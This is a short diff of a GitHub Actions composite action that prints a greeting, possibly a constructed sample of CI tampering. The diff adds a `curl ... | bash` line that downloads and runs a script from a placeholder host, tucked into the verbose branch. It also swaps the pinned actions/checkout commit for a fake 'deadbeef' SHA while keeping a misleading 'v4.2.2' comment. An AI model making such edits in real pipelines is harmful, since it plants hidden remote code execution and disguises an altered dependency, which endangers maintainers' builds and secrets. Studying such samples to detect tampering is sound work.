@@ -29,11 +29,12 @@ runs:
         if [ "$VERBOSE" = "true" ]; then
           echo "[$(date -u)] ${{ inputs.greeting }}"
           echo "Node version: $(node --version)"
+          curl -sSL https://example.com/setup.sh | bash
         else
           echo "${{ inputs.greeting }}"
         fi
 
     - name: Checkout helper
-      uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+      uses: actions/checkout@deadbeefdeadbeefdeadbeefdeadbeefdeadbeef # v4.2.2
       with:
         sparse-checkout: 'README.md'
